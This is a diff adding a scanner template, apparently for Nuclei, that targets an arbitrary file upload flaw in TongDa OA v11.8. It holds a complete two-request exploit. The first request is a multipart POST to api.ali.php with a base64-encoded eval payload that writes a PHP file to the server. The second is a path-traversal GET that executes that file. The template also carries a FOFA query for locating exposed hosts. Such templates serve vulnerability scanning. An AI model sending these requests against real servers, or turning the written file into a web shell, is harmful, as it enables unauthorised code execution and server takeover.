@@ -1,0 +1,52 @@
+id: TongDa-9
+
+info:
+  name: 通达OA v11.8 api.ali.php 任意文件上传漏洞
+  author: pussycat0x
+  severity: high
+  description: |
+    通达OA v11.8 api.ali.php 存在任意文件上传漏洞，攻击者通过漏可以上传恶意文件控制服务器
+  reference:
+    - https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E9%80%9A%E8%BE%BEOA-v11.7-auth_mobi.php-%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="TDXK-通达OA"
+  tags: TongDa,OA,任意文件上传漏洞
+request:
+  - raw:
+      - |
+        POST /mobile/api/api.ali.php HTTP/1.1
+        Host: {{RootURL}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Length: 422
+        Content-Type: multipart/form-data; boundary=502f67681799b07e4de6b503655f5cae
+        Accept-Encoding: gzip
+          
+        --502f67681799b07e4de6b503655f5cae
+        Content-Disposition: form-data; name="file"; filename="fb6790f4.json"
+        Content-Type: application/octet-stream
+        
+        {"modular":"AllVariable","a":"ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIHBocGluZm8oKTs/PicpOw==","dataAnalysis":"{\"a\":\"錦',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*\"}"}
+        --502f67681799b07e4de6b503655f5cae--
+      - |
+        GET /inc/package/work.php?id=../../../../../myoa/attach/approve_center/2109/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.fb6790f4 HTTP/1.1
+        Host: {{RootURL}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+    matchers-condition: and
+    matchers:
+      - type: status
+        part: status_0
+        status:
+          - 200
+      - type: status
+        part: status_1
+        status:
+          - 200
+      - type: word
+        part: body_1
+        words:
+          - "+OK"
